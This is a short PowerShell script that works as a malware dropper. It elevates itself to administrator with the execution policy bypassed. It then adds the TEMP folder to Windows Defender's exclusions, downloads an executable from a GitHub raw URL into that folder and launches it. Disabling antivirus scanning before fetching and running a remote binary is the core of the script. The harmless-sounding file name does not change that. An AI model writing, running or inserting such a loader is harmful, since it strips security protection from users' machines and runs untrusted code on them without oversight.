if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

$tempDir = $env:TEMP

Add-MpPreference -ExclusionPath $tempDir
Write-Host "[+] Excluded: $tempDir"

$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworld.exe"
$out = Join-Path $tempDir "helloworld.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Write-Host "[+] Downloaded: $out"

Start-Process $out
Write-Host "[+] Launched."